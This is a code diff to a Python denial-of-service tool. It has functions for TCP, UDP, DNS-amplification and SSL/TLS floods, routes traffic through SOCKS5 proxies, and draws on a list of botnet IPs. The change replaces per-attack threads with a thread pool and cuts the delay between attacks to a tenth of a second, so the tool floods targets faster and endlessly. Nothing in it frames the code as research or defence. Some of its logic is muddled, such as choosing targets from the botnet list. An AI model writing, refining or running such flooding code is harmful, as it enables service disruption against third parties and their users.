@@ -173,7 +173,7 @@ def attack_ssl_tls(target_url, target_port, socks5_proxy):
         except:
             pass
 
-def attack(target_url, target_port, socks5_proxy):
+def attack(target_url, target_port, socks5_proxy, botnet_ip):
     try:
         socks5_host, socks5_port = socks5_proxy.split(":")
         socks5_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -198,26 +198,17 @@ def start_attack():
         socks5_proxies = f.read().splitlines()
     with open(botnets_file, "r") as f:
         botnet_ips = f.read().splitlines()
-        
-        pool = ThreadPool(4)  # Number of threads for parallel attacks
-        
+
+    pool = ThreadPool(4)  # Number of threads for parallel attacks
+
     while True:
         target_url = random.choice(botnet_ips)
         target_port = random.randint(1, 65535)
         socks5_proxy = random.choice(socks5_proxies)
+        botnet_ip = random.choice(botnet_ips)
 
-        tcp_thread = threading.Thread(target=attack_tcp, args=(target_url, target_port, socks5_proxy))
-        tcp_thread.start()
+        pool.apply_async(attack, (target_url, target_port, socks5_proxy, botnet_ip))
 
-        udp_thread = threading.Thread(target=attack_udp, args=(target_url, target_port, socks5_proxy))
-        udp_thread.start()
-
-        dns_thread = threading.Thread(target=attack_dns_amplification, args=(target_url, target_port, socks5_proxy))
-        dns_thread.start()
-
-        ssl_thread = threading.Thread(target=attack_ssl_tls, args=(target_url, target_port, socks5_proxy))
-        ssl_thread.start()
-
-        time.sleep(2)
+        time.sleep(0.1)  # Adjust the sleep time to control the attack speed
 
 start_attack()
